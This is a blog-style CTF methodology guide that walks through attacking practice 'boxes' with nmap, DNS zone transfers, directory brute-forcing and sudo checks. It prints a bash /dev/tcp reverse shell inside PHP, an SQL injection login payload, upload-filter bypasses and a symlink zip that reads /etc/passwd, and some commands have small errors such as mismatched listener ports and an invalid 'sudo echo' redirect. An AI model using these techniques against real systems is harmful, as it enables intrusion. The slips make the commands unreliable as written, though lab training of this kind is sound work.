---
title: Anatomy of a Box Writeup
author: Mouna
date: 2024-01-01 11:33:00 +0800
categories: [CTF]
tags: [Layout]
---
## Introduction
In hack the box, root-me and similar war-game security challenges, we often follow an identical pattern when trying to get a certain flag from the so called "boxes".

In this article, I will try to outline this pattern in what I would like to call a ctf mold, or, like the title states, an "Anatomy of a box writeup".

In this article, we consider that we are connected to a vpn that allows us to interact with the network of the victim machine. This victim machine will have the following ip address : 10.13.37.10

In most CTF challenges, a vpn file is given.
> Please double check that you are connected to the `provided vpn` before starting. 
{: .prompt-warning }

## Discovery
The starting point is almost always the same : Enumerate to discover the open ports that may help us get an initial foothold in the machine. After all, at this point all we have is an ip address and a challenge title (that sometimes contains some hints).

To do so, we run `nmap` as follows:
```bash
$ nmap -n -Pn -sV 10.13.37.10
    PORT        STATE SERVICE VERSION
    22/tcp      open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    53/tcp      open  domain   ISC BIND 9.10.3-P4 (Ubuntu Linux)
    80/tcp      open  http     nginx 1.10.3 (Ubuntu)
    5555/tcp    open  freeciv?
    7777/tcp    open  cbt?
    9999/tcp    open  abyss?

```
All the ports shown in the output should be considered. In this example, we have 3 useful ports: 22 for ssh, 53 for DNS and 80 for an http server. The others aren't very well-defined and are probably not useful to us.

Obtaining an ssh connection to the machine is our goal, but that requires having valid credentials : a username/password or a private key to be able to authenticate into the machine.
We will try to explore the other ports and how they can be leveraged to get the essential credentials.

A first step would be to search for any vulnerabilities in these services for the versions provided by nmap.

## HTTP
The first step is to access the following url: `http://10.13.37.10:80`

If it resolves into a domain name, say for example: `http://sowon.mold`, it will have to be added to our `/etc/hosts` file.

To do so, we execute the following:
```bash
$ sudo echo '10.13.37.10 sowon.mold' >> /etc/hosts
```
Once in the webpage, check all pages and look for webpages that are of interest: a login page, a file submission page, some known web-building block (wordpress, joomla, Spring boot and actuators...)

### Login Page
The first step is to look for credentials in source code and maybe try to use an `SQL injection` by trying the payload `‘ or 1=1 — -`.Otherwise use `burp` to bruteforce for default credentials.

If the website is based on a known ticket management system, a content management system or similar, look online for possible default credentials and try them, or for possible past vulnerable versions.

: Examples of default credentials are: admin/admin, user/password, root/password etc...

### Known CMS (Content Management System)
The first thing to do is to search online for known vuulnerabilities and exploits. To do that we can search for `name_of_CMS used_version CVE exploit`.

#### Joomla CMS
When a Joomla CMS based website is encountered, `joomscan` is a very useful tool that can help us get a lot of information, including credentials that may be used later for privilege escalation.

### File upload page
When a webpage allows file upload, an attacker can upload a file containing malicious code and run it.

Some of these webpages are protected by black-listing some file extensions, but that can easily be bypassed. Some techniques include doubling extensions `file.png.php` or adding null-bytes `file.php%00.png`

When we can upload files, always think of reverse shell php files.

You can use ready-to-use ones like the one found here: <https://pentestmonkey.net/tools/web-shells/php-reverse-shell>

#### php code for reverse shell
An example of php code that can be injected to retrieve a reverse shell on port 9001 is:
```php
<?php
system('bash -c "bash -i >& /dev/tcp/10.13.37.10/9001 0>&1"');
php>
```

N.B.: make sure you have run the following command beforehand, to have an active listener on your machine for any incoming connections:
```bash
$ nc -nvlp 9991
```
#### Zip file upload
In some cases, the security measure in place is a white-listing of certain files. One example that I encountered is a webpage that asks specifically for a pdf file in a zip file. In this case, I used symlinks.

The following command creates a link to the file `../../../../../../etc/passwd` and names that link as `document.pdf`
```bash
$ ln -s ../../../../../../etc/passwd document.pdf
```

The next command creates a symlink zip that will be uploaded.
```bash
$ zip --symlinks doc.zip document.pdf
```

After uploading, the webpage provides the url of the file location.

By inspecting the Network exchange we get a base64 response (stored in `responsebase64characters`) that is then deciphered using the following:
```bash
$ echo responsebase64characters | base64 -d
```

### Brute-force enumeration of directories and files
This is a technique that uses known wordlists to brute-force for files and directories hosted in the webserver and that aren't directly accessible by the user from the previous webpage.

These are some commands that help do that:
```bash
$ dirb http://sowon.mold
```
```bash
$ dirsearch -u http://sowon.mold
```
```bash
$ gobuster dir -u http://sowon.mold -w /wordlists/Discovery/Web-Content/common.txt
```

We can also check for virtual hosts, which are directories and files that are hosted in virtual environments and have a different DNS subdomain:
```bash
$ gobuster vhost -u sowon.mold -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

## DNS
The first step is to execute a dig (Domain Information Groper) command to perform a lookup of the provided name servers or ip addresses and show the results.

```bash
$ dig -x 10.13.37.10 @10.13.37.10       

; <<>> DiG 9.19.17-1-Debian <<>> -x 10.13.37.10 @10.13.37.10
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 10141
;; flags: qr aa rd; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;10.37.13.10.in-addr.arpa.      IN      PTR

;; AUTHORITY SECTION:
37.13.10.in-addr.arpa.  604800  IN      SOA     www.sowon.mold. sowon.mold. 3 604800 86400 2419200 604800

;; Query time: 23 msec
;; SERVER: 10.13.37.10##53(10.13.37.10) (UDP)
;; WHEN: Fri Jan 05 09:21:21 EST 2024
;; MSG SIZE  rcvd: 109
```
For this example, the Authority section is interesting since it shows the `www.sowon.mold` address which is another webpage that may be of interest to us.

```bash
$ dig axfr sowon.mold @10.13.37.10

; <<>> DiG 9.19.17-1-Debian <<>> axfr sowon.mold @10.13.37.10
;; global options: +cmd
sowon.mold.       604800  IN      SOA     www.sowon.mold. sowon.mold. 2 604800 86400 2419200 604800
sowon.mold.       604800  IN      NS      www.sowon.mold.
sowon.mold.       604800  IN      A       10.13.37.10
www.sowon.mold.   604800  IN      A       10.13.37.10
preprod-payroll.sowon.mold  604800  IN      CNAME       sowon.mold
sowon.mold.       604800  IN      SOA     www.sowon.mold. sowon.mold. 2 604800 86400 2419200 604800
;; Query time: 155 msec
;; SERVER: 10.13.37.10##53(10.13.37.10) (TCP)
;; WHEN: Fri Jan 05 09:21:27 EST 2024
;; XFR size: 5 records (messages 1, bytes 167)
```
In this example, we have a `preprod-payroll.sowon.mold` subdomain that should be added to our `/etc/hosts` file and inspected as well.

## Databases : SQL, KeePass, ...
To escalate privileges, a common approach is to search for databases or their files, especially the ones that may contain passwords. This is why we should look for services such as SQL that are running on a vulnerable version, or Keepass files.

* For any database file encountered, run a `strings db_file` to look for any useful information that may be loosely encrypted and secured. `strings` is a better choice than `cat` because of the type of these files.

* If a KDBX file is encountered while looking to escalate privileges, use this script to get the master key of the keepass dump file : <https://github.com/matro7sh/keepass-dump-masterkey/blob/main/poc.py> . This key will help us log into the keepass file and view all saved passwords.

* If an SQL database is present, which is mostly the case when the box hosts webservers, look up if there are any vulnerabilities specific to that sql version.

* If it's possible, access the SQL database and search through the tables for something interesting like `users` or `credentials` etc...

## Privilege Escalation
The following is a command that should always be ran when we have an initial access to a box and are trying to get higher privileges:

```bash
$ sudo -l
```
The output is all the commands and scripts that the current user can run as sudo. This usually helps us get a sudo shell; which is our goal.

## Conclusion
The main steps to follow using this Writeup anatomy are: 
1. Network Discovery to assess the target machine.
2. Exploring every available information to gain more information.
3. Eventually gaining a low-privilege access.
4. Gaining more information.
5. Privilege Escalation.

> I think it's very important to follow a tutorial or writeup on how to root one's first box. However, I think that even for a complete beginner, generalized tutorials are way more helpful in the long run. I hope this covers enough ground to root a couple of easy to medium boxes.
{: .prompt-info }